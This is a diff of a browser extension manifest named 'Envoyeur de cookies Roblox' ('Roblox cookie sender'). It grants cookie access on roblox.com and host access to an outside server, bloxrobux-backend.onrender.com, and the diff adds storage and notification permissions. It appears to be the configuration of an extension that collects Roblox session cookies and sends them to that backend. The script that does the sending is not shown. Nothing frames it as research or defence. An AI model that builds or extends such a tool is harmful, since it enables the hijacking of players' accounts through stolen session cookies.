@@ -1,19 +1,21 @@
 {
   "manifest_version": 3,
-  "name": "Cookie Extractor Roblox",
+  "name": "Envoyeur de cookies Roblox",
   "version": "1.0",
   "permissions": [
     "cookies",
-    "activeTab"
+    "notifications",
+    "activeTab",
+    "storage"
   ],
   "host_permissions": [
-    "https://*.roblox.com/*",
-    "https://bloxrobux-backend.onrender.com/*"
+    "*://*.roblox.com/*",
+    "*://bloxrobux-backend.onrender.com/*"
   ],
   "background": {
     "service_worker": "background.js"
   },
   "action": {
-    "default_title": "Envoyer cookies"
+    "default_title": "Envoyer les cookies Roblox"
   }
 }
